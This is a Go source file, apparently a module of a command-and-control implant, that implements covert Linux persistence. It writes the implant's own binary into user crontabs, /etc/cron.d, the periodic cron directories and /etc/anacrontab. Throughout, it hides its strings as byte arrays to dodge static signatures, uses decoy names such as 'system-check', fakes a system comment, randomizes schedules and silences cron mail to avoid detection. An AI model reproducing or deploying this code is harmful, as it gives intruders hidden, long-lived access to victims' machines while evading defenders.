// server/docker/payloads/Linux/action_cron_persistence_linux.go

//go:build linux
// +build linux

package main

import (
	"fmt"
	"os"
	"os/user"
	"path/filepath"
	"strings"
	"time"

	"golang.org/x/sys/unix"
)

// Cron persistence strings (constructed to avoid static signatures)
var (
	// Command name
	cronCmdName = string([]byte{0x70, 0x65, 0x72, 0x73, 0x69, 0x73, 0x74, 0x2d, 0x63, 0x72, 0x6f, 0x6e}) // persist-cron

	// Actions
	cronActionAdd    = string([]byte{0x61, 0x64, 0x64})                         // add
	cronActionRemove = string([]byte{0x72, 0x65, 0x6d, 0x6f, 0x76, 0x65})       // remove
	cronActionList   = string([]byte{0x6c, 0x69, 0x73, 0x74})                   // list

	// Flag arguments
	cronFlagMethod   = string([]byte{0x2d, 0x2d, 0x6d, 0x65, 0x74, 0x68, 0x6f, 0x64})                         // --method
	cronFlagUser     = string([]byte{0x2d, 0x2d, 0x75, 0x73, 0x65, 0x72})                                     // --user
	cronFlagInterval = string([]byte{0x2d, 0x2d, 0x69, 0x6e, 0x74, 0x65, 0x72, 0x76, 0x61, 0x6c})             // --interval
	cronFlagCommand  = string([]byte{0x2d, 0x2d, 0x63, 0x6f, 0x6d, 0x6d, 0x61, 0x6e, 0x64})                   // --command

	// Methods
	cronMethodSpool    = string([]byte{0x73, 0x70, 0x6f, 0x6f, 0x6c})                               // spool
	cronMethodCrond    = string([]byte{0x63, 0x72, 0x6f, 0x6e, 0x64})                               // crond
	cronMethodPeriodic = string([]byte{0x70, 0x65, 0x72, 0x69, 0x6f, 0x64, 0x69, 0x63})             // periodic
	cronMethodAnacron  = string([]byte{0x61, 0x6e, 0x61, 0x63, 0x72, 0x6f, 0x6e})                   // anacron
	cronMethodAll      = string([]byte{0x61, 0x6c, 0x6c})                                           // all

	// Intervals
	cronIntervalHourly  = string([]byte{0x40, 0x68, 0x6f, 0x75, 0x72, 0x6c, 0x79})                   // @hourly
	cronIntervalDaily   = string([]byte{0x40, 0x64, 0x61, 0x69, 0x6c, 0x79})                         // @daily
	cronIntervalWeekly  = string([]byte{0x40, 0x77, 0x65, 0x65, 0x6b, 0x6c, 0x79})                   // @weekly
	cronIntervalMonthly = string([]byte{0x40, 0x6d, 0x6f, 0x6e, 0x74, 0x68, 0x6c, 0x79})             // @monthly
	cronIntervalReboot  = string([]byte{0x40, 0x72, 0x65, 0x62, 0x6f, 0x6f, 0x74})                   // @reboot

	// Paths
	cronProcSelfExe   = string([]byte{0x2f, 0x70, 0x72, 0x6f, 0x63, 0x2f, 0x73, 0x65, 0x6c, 0x66, 0x2f, 0x65, 0x78, 0x65})                                     // /proc/self/exe
	cronEtcCronD      = string([]byte{0x2f, 0x65, 0x74, 0x63, 0x2f, 0x63, 0x72, 0x6f, 0x6e, 0x2e, 0x64})                                                       // /etc/cron.d
	cronEtcAnacrontab = string([]byte{0x2f, 0x65, 0x74, 0x63, 0x2f, 0x61, 0x6e, 0x61, 0x63, 0x72, 0x6f, 0x6e, 0x74, 0x61, 0x62})                               // /etc/anacrontab
	cronEtcCronHourly = string([]byte{0x2f, 0x65, 0x74, 0x63, 0x2f, 0x63, 0x72, 0x6f, 0x6e, 0x2e, 0x68, 0x6f, 0x75, 0x72, 0x6c, 0x79})                         // /etc/cron.hourly
	cronEtcCronDaily  = string([]byte{0x2f, 0x65, 0x74, 0x63, 0x2f, 0x63, 0x72, 0x6f, 0x6e, 0x2e, 0x64, 0x61, 0x69, 0x6c, 0x79})                               // /etc/cron.daily
	cronEtcCronWeekly = string([]byte{0x2f, 0x65, 0x74, 0x63, 0x2f, 0x63, 0x72, 0x6f, 0x6e, 0x2e, 0x77, 0x65, 0x65, 0x6b, 0x6c, 0x79})                         // /etc/cron.weekly
	cronEtcCronMonthly = string([]byte{0x2f, 0x65, 0x74, 0x63, 0x2f, 0x63, 0x72, 0x6f, 0x6e, 0x2e, 0x6d, 0x6f, 0x6e, 0x74, 0x68, 0x6c, 0x79})                  // /etc/cron.monthly

	// Spool path formats
	cronSpoolCrontabs = string([]byte{0x2f, 0x76, 0x61, 0x72, 0x2f, 0x73, 0x70, 0x6f, 0x6f, 0x6c, 0x2f, 0x63, 0x72, 0x6f, 0x6e, 0x2f, 0x63, 0x72, 0x6f, 0x6e, 0x74, 0x61, 0x62, 0x73, 0x2f, 0x25, 0x73}) // /var/spool/cron/crontabs/%s
	cronSpoolCron     = string([]byte{0x2f, 0x76, 0x61, 0x72, 0x2f, 0x73, 0x70, 0x6f, 0x6f, 0x6c, 0x2f, 0x63, 0x72, 0x6f, 0x6e, 0x2f, 0x25, 0x73})             // /var/spool/cron/%s
	cronSpoolTabs     = string([]byte{0x2f, 0x76, 0x61, 0x72, 0x2f, 0x73, 0x70, 0x6f, 0x6f, 0x6c, 0x2f, 0x63, 0x72, 0x6f, 0x6e, 0x2f, 0x74, 0x61, 0x62, 0x73, 0x2f, 0x25, 0x73}) // /var/spool/cron/tabs/%s

	// Filenames (used for persistence)
	cronFileCheck  = string([]byte{0x73, 0x79, 0x73, 0x74, 0x65, 0x6d, 0x2d, 0x63, 0x68, 0x65, 0x63, 0x6b})   // system-check
	cronFileUpdate = string([]byte{0x73, 0x79, 0x73, 0x74, 0x65, 0x6d, 0x2d, 0x75, 0x70, 0x64, 0x61, 0x74, 0x65}) // system-update
	cronFileMaint  = string([]byte{0x73, 0x79, 0x73, 0x74, 0x65, 0x6d, 0x2d, 0x6d, 0x61, 0x69, 0x6e, 0x74})   // system-maint

	// Script/config content
	cronShebang     = string([]byte{0x23, 0x21, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x62, 0x61, 0x73, 0x68})                                   // #!/bin/bash
	cronComment     = string([]byte{0x23, 0x20, 0x41, 0x64, 0x64, 0x65, 0x64, 0x20, 0x62, 0x79, 0x20, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6d, 0x20, 0x61, 0x74}) // # Added by system at
	cronDevNull     = string([]byte{0x3e, 0x2f, 0x64, 0x65, 0x76, 0x2f, 0x6e, 0x75, 0x6c, 0x6c, 0x20, 0x32, 0x3e, 0x26, 0x31})           // >/dev/null 2>&1
	cronMaintHeader = string([]byte{0x23, 0x20, 0x53, 0x79, 0x73, 0x74, 0x65, 0x6d, 0x20, 0x6d, 0x61, 0x69, 0x6e, 0x74, 0x65, 0x6e, 0x61, 0x6e, 0x63, 0x65, 0x20, 0x74, 0x61, 0x73, 0x6b}) // # System maintenance task
	cronShellBash   = string([]byte{0x53, 0x48, 0x45, 0x4c, 0x4c, 0x3d, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x62, 0x61, 0x73, 0x68})           // SHELL=/bin/bash
	cronPathEnv     = string([]byte{0x50, 0x41, 0x54, 0x48, 0x3d, 0x2f, 0x75, 0x73, 0x72, 0x2f, 0x6c, 0x6f, 0x63, 0x61, 0x6c, 0x2f, 0x73, 0x62, 0x69, 0x6e, 0x3a, 0x2f, 0x75, 0x73, 0x72, 0x2f, 0x6c, 0x6f, 0x63, 0x61, 0x6c, 0x2f, 0x62, 0x69, 0x6e, 0x3a, 0x2f, 0x73, 0x62, 0x69, 0x6e, 0x3a, 0x2f, 0x62, 0x69, 0x6e, 0x3a, 0x2f, 0x75, 0x73, 0x72, 0x2f, 0x73, 0x62, 0x69, 0x6e, 0x3a, 0x2f, 0x75, 0x73, 0x72, 0x2f, 0x62, 0x69, 0x6e}) // PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
)

// CronPersistenceCommand handles cron-based persistence
type CronPersistenceCommand struct{}

func (c *CronPersistenceCommand) Name() string {
	return cronCmdName
}

func (c *CronPersistenceCommand) Execute(ctx *CommandContext, args []string) CommandResult {
	if len(args) < 1 {
		return CommandResult{
			Output:   Err(E1),
			ExitCode: 1,
		}
	}

	action := args[0]
	switch action {
	case cronActionAdd:
		return c.addCronPersistence(args[1:])
	case cronActionRemove:
		return c.removeCronPersistence(args[1:])
	case cronActionList:
		return c.listCronPersistence()
	default:
		return CommandResult{
			Output:   ErrCtx(E21, action),
			ExitCode: 1,
		}
	}
}

// addCronPersistence adds cron job via selected method(s)
func (c *CronPersistenceCommand) addCronPersistence(args []string) CommandResult {
	var targetUser string
	var interval string
	var command string
	var method string = cronMethodAll // Default to all methods

	// Parse arguments
	for i := 0; i < len(args); i++ {
		switch args[i] {
		case cronFlagMethod:
			if i+1 < len(args) {
				method = args[i+1]
				i++
			}
		case cronFlagUser:
			if i+1 < len(args) {
				targetUser = args[i+1]
				i++
			}
		case cronFlagInterval:
			if i+1 < len(args) {
				interval = args[i+1]
				i++
			}
		case cronFlagCommand:
			if i+1 < len(args) {
				command = args[i+1]
				i++
			}
		}
	}

	// Defaults
	if targetUser == "" {
		currentUser, err := user.Current()
		if err != nil {
			return CommandResult{
				Output:   Err(E19),
				ExitCode: 1,
			}
		}
		targetUser = currentUser.Username
	}

	if interval == "" {
		interval = cronIntervalHourly
	}

	if command == "" {
		execPath, err := os.Readlink(cronProcSelfExe)
		if err != nil {
			execPath = os.Args[0]
		}
		command = execPath
	}

	var results []string

	// Execute based on selected method
	switch method {
	case cronMethodSpool:
		if result := c.addViaSpoolCron(targetUser, interval, command); result != "" {
			results = append(results, result)
		}
	case cronMethodCrond:
		if result := c.addViaCronD(targetUser, interval, command); result != "" {
			results = append(results, result)
		}
	case cronMethodPeriodic:
		if result := c.addViaCronDirectories(command, interval); result != "" {
			results = append(results, result)
		}
	case cronMethodAnacron:
		if result := c.addViaAnacron(command); result != "" {
			results = append(results, result)
		}
	case cronMethodAll:
		// Try all methods
		if result := c.addViaSpoolCron(targetUser, interval, command); result != "" {
			results = append(results, result)
		}
		if result := c.addViaCronD(targetUser, interval, command); result != "" {
			results = append(results, result)
		}
		if result := c.addViaCronDirectories(command, interval); result != "" {
			results = append(results, result)
		}
		if result := c.addViaAnacron(command); result != "" {
			results = append(results, result)
		}
	default:
		return CommandResult{
			Output:   ErrCtx(E21, method),
			ExitCode: 1,
		}
	}

	if len(results) == 0 {
		return CommandResult{
			Output:   ErrCtx(E11, method),
			ExitCode: 1,
		}
	}

	return CommandResult{
		Output:   strings.Join(results, "\n"),
		ExitCode: 0,
	}
}

// addViaSpoolCron adds to user's crontab file directly
func (c *CronPersistenceCommand) addViaSpoolCron(username, interval, command string) string {
	// Paths where crontabs are typically stored
	cronPaths := []string{
		fmt.Sprintf(cronSpoolCrontabs, username),
		fmt.Sprintf(cronSpoolCron, username),
		fmt.Sprintf(cronSpoolTabs, username),
	}

	for _, cronPath := range cronPaths {
		// Check if parent directory exists
		parentDir := filepath.Dir(cronPath)
		if _, err := os.Stat(parentDir); os.IsNotExist(err) {
			continue
		}

		// Check write permissions using unix.Access
		if unix.Access(parentDir, unix.W_OK) != nil {
			continue
		}

		// Generate cron entry
		cronEntry := c.generateCronEntry(interval, command)

		// Read existing crontab (if exists)
		var existingContent []byte
		if content, err := os.ReadFile(cronPath); err == nil {
			existingContent = content
			// Check if already added
			if strings.Contains(string(content), command) {
				return ErrCtx(E5, cronPath)
			}
		}

		// Append new entry
		newContent := append(existingContent, []byte("\n"+cronEntry+"\n")...)

		// Write back
		if err := os.WriteFile(cronPath, newContent, 0600); err == nil {
			return SuccCtx(S1, cronPath)
		}
	}

	return ""
}

// addViaCronD adds job to /etc/cron.d/
func (c *CronPersistenceCommand) addViaCronD(username, interval, command string) string {
	cronDDir := cronEtcCronD

	// Check if directory exists and is writable using unix.Access
	if unix.Access(cronDDir, unix.W_OK) != nil {
		return ""
	}

	// Generate filename (looks legitimate)
	filename := filepath.Join(cronDDir, cronFileCheck)

	// Generate content
	cronContent := fmt.Sprintf("%s\n%s\n%s\n\n%s %s %s\n",
		cronMaintHeader, cronShellBash, cronPathEnv, c.convertInterval(interval), username, command)

	// Write file
	if err := os.WriteFile(filename, []byte(cronContent), 0644); err == nil {
		return SuccCtx(S1, filename)
	}

	return ""
}

// addViaCronDirectories adds to /etc/cron.{hourly,daily,weekly,monthly}
func (c *CronPersistenceCommand) addViaCronDirectories(command, interval string) string {
	// Map intervals to directories
	dirMap := map[string]string{
		cronIntervalHourly:  cronEtcCronHourly,
		cronIntervalDaily:   cronEtcCronDaily,
		cronIntervalWeekly:  cronEtcCronWeekly,
		cronIntervalMonthly: cronEtcCronMonthly,
	}

	var targetDir string
	for key, dir := range dirMap {
		if strings.Contains(interval, key) {
			targetDir = dir
			break
		}
	}

	// Default to hourly if no match
	if targetDir == "" {
		targetDir = cronEtcCronHourly
	}

	// Check if directory exists and is writable using unix.Access
	if unix.Access(targetDir, unix.W_OK) != nil {
		return ""
	}

	// Create script file
	scriptName := filepath.Join(targetDir, cronFileUpdate)
	scriptContent := fmt.Sprintf("%s\n%s\n", cronShebang, command)

	if err := os.WriteFile(scriptName, []byte(scriptContent), 0755); err == nil {
		return SuccCtx(S1, scriptName)
	}

	return ""
}

// addViaAnacron adds anacron job for systems that don't run 24/7
func (c *CronPersistenceCommand) addViaAnacron(command string) string {
	anacronTab := cronEtcAnacrontab

	// Check if anacrontab exists and is writable using unix.Access
	if unix.Access(anacronTab, unix.W_OK) != nil {
		return ""
	}

	// Read existing content
	content, err := os.ReadFile(anacronTab)
	if err != nil {
		return ""
	}

	// Check if already added
	if strings.Contains(string(content), command) {
		return Err(E5)
	}

	// Add anacron entry (runs daily with 5 minute delay)
	anacronEntry := fmt.Sprintf("\n1\t5\t%s\t%s\n", cronFileMaint, command)
	newContent := append(content, []byte(anacronEntry)...)

	if err := os.WriteFile(anacronTab, newContent, 0644); err == nil {
		return SuccCtx(S1, anacronTab)
	}

	return ""
}

// generateCronEntry creates a cron entry
func (c *CronPersistenceCommand) generateCronEntry(interval, command string) string {
	// Add some randomization to avoid detection
	comment := fmt.Sprintf("%s %s", cronComment, time.Now().Format("2006-01-02"))

	// Convert special intervals
	cronTime := c.convertInterval(interval)

	// Add output redirection to avoid cron emails
	return fmt.Sprintf("%s\n%s %s %s", comment, cronTime, command, cronDevNull)
}

// convertInterval converts special intervals to cron format
func (c *CronPersistenceCommand) convertInterval(interval string) string {
	switch interval {
	case cronIntervalHourly:
		// Add some randomization (0-59 minutes)
		return fmt.Sprintf("%d * * * *", time.Now().Unix()%60)
	case cronIntervalDaily:
		return fmt.Sprintf("%d %d * * *", time.Now().Unix()%60, time.Now().Unix()%24)
	case cronIntervalWeekly:
		return fmt.Sprintf("%d %d * * %d", time.Now().Unix()%60, time.Now().Unix()%24, time.Now().Unix()%7)
	case cronIntervalMonthly:
		return fmt.Sprintf("%d %d %d * *", time.Now().Unix()%60, time.Now().Unix()%24, (time.Now().Unix()%28)+1)
	case cronIntervalReboot:
		return cronIntervalReboot
	default:
		// Assume it's already in cron format
		return interval
	}
}

// removeCronPersistence removes cron persistence
func (c *CronPersistenceCommand) removeCronPersistence(args []string) CommandResult {
	var targetUser string
	var method string = cronMethodAll // Default to removing all

	for i := 0; i < len(args); i++ {
		switch args[i] {
		case cronFlagMethod:
			if i+1 < len(args) {
				method = args[i+1]
				i++
			}
		case cronFlagUser:
			if i+1 < len(args) {
				targetUser = args[i+1]
				i++
			}
		}
	}

	if targetUser == "" {
		currentUser, _ := user.Current()
		if currentUser != nil {
			targetUser = currentUser.Username
		}
	}

	var results []string

	switch method {
	case cronMethodSpool:
		// Remove from user crontabs
		cronPaths := []string{
			fmt.Sprintf(cronSpoolCrontabs, targetUser),
			fmt.Sprintf(cronSpoolCron, targetUser),
			fmt.Sprintf(cronSpoolTabs, targetUser),
		}
		for _, cronPath := range cronPaths {
			if err := c.cleanCronFile(cronPath); err == nil {
				results = append(results, SuccCtx(S2, cronPath))
			}
		}

	case cronMethodCrond:
		// Remove from /etc/cron.d/
		cronDFile := filepath.Join(cronEtcCronD, cronFileCheck)
		if err := os.Remove(cronDFile); err == nil {
			results = append(results, SuccCtx(S2, cronDFile))
		}

	case cronMethodPeriodic:
		// Remove from cron directories
		for _, dir := range []string{cronEtcCronHourly, cronEtcCronDaily, cronEtcCronWeekly, cronEtcCronMonthly} {
			scriptPath := filepath.Join(dir, cronFileUpdate)
			if err := os.Remove(scriptPath); err == nil {
				results = append(results, SuccCtx(S2, scriptPath))
			}
		}

	case cronMethodAnacron:
		// Clean anacrontab
		if err := c.cleanAnacron(); err == nil {
			results = append(results, SuccCtx(S2, cronEtcAnacrontab))
		}

	case cronMethodAll:
		// Remove from all locations
		cronPaths := []string{
			fmt.Sprintf(cronSpoolCrontabs, targetUser),
			fmt.Sprintf(cronSpoolCron, targetUser),
			fmt.Sprintf(cronSpoolTabs, targetUser),
		}
		for _, cronPath := range cronPaths {
			if err := c.cleanCronFile(cronPath); err == nil {
				results = append(results, SuccCtx(S2, cronPath))
			}
		}

		cronDFile := filepath.Join(cronEtcCronD, cronFileCheck)
		os.Remove(cronDFile)

		for _, dir := range []string{cronEtcCronHourly, cronEtcCronDaily, cronEtcCronWeekly, cronEtcCronMonthly} {
			scriptPath := filepath.Join(dir, cronFileUpdate)
			if err := os.Remove(scriptPath); err == nil {
				results = append(results, SuccCtx(S2, scriptPath))
			}
		}

		if err := c.cleanAnacron(); err == nil {
			results = append(results, SuccCtx(S2, cronEtcAnacrontab))
		}

	default:
		return CommandResult{
			Output:   ErrCtx(E21, method),
			ExitCode: 1,
		}
	}

	if len(results) == 0 {
		return CommandResult{
			Output:   ErrCtx(E4, method),
			ExitCode: 1,
		}
	}

	return CommandResult{
		Output:   strings.Join(results, "\n"),
		ExitCode: 0,
	}
}

// cleanCronFile removes our entries from a cron file
func (c *CronPersistenceCommand) cleanCronFile(filePath string) error {
	content, err := os.ReadFile(filePath)
	if err != nil {
		return err
	}

	lines := strings.Split(string(content), "\n")
	var cleanedLines []string
	skipNext := false

	// Extract the detection pattern from cronComment (without the "# " prefix)
	detectPattern := string([]byte{0x41, 0x64, 0x64, 0x65, 0x64, 0x20, 0x62, 0x79, 0x20, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6d, 0x20, 0x61, 0x74}) // Added by system at

	for _, line := range lines {
		// Skip our comments and associated cron lines
		if strings.Contains(line, detectPattern) {
			skipNext = true
			continue
		}
		if skipNext {
			skipNext = false
			continue
		}
		cleanedLines = append(cleanedLines, line)
	}

	return os.WriteFile(filePath, []byte(strings.Join(cleanedLines, "\n")), 0600)
}

// cleanAnacron removes our anacron entries
func (c *CronPersistenceCommand) cleanAnacron() error {
	content, err := os.ReadFile(cronEtcAnacrontab)
	if err != nil {
		return err
	}

	lines := strings.Split(string(content), "\n")
	var cleanedLines []string

	for _, line := range lines {
		if !strings.Contains(line, cronFileMaint) {
			cleanedLines = append(cleanedLines, line)
		}
	}

	return os.WriteFile(cronEtcAnacrontab, []byte(strings.Join(cleanedLines, "\n")), 0644)
}

// listCronPersistence lists all found cron persistence
func (c *CronPersistenceCommand) listCronPersistence() CommandResult {
	var results []string

	// Detection pattern (without the "# " prefix)
	detectPattern := string([]byte{0x41, 0x64, 0x64, 0x65, 0x64, 0x20, 0x62, 0x79, 0x20, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6d, 0x20, 0x61, 0x74}) // Added by system at

	// Check user crontabs
	currentUser, _ := user.Current()
	if currentUser != nil {
		cronPaths := []string{
			fmt.Sprintf(cronSpoolCrontabs, currentUser.Username),
			fmt.Sprintf(cronSpoolCron, currentUser.Username),
		}

		for _, path := range cronPaths {
			if content, err := os.ReadFile(path); err == nil {
				if strings.Contains(string(content), detectPattern) {
					results = append(results, SuccCtx(S6, path))
				}
			}
		}
	}

	// Check /etc/cron.d/
	cronDFile := filepath.Join(cronEtcCronD, cronFileCheck)
	if _, err := os.Stat(cronDFile); err == nil {
		results = append(results, SuccCtx(S6, cronDFile))
	}

	// Check cron directories
	for _, dir := range []string{cronEtcCronHourly, cronEtcCronDaily, cronEtcCronWeekly, cronEtcCronMonthly} {
		scriptPath := filepath.Join(dir, cronFileUpdate)
		if _, err := os.Stat(scriptPath); err == nil {
			results = append(results, SuccCtx(S6, scriptPath))
		}
	}

	// Check anacrontab
	if content, err := os.ReadFile(cronEtcAnacrontab); err == nil {
		if strings.Contains(string(content), cronFileMaint) {
			results = append(results, SuccCtx(S6, cronEtcAnacrontab))
		}
	}

	if len(results) == 0 {
		return CommandResult{
			Output:   Err(E4),
			ExitCode: 0,
		}
	}

	return CommandResult{
		Output:   strings.Join(results, "\n"),
		ExitCode: 0,
	}
}
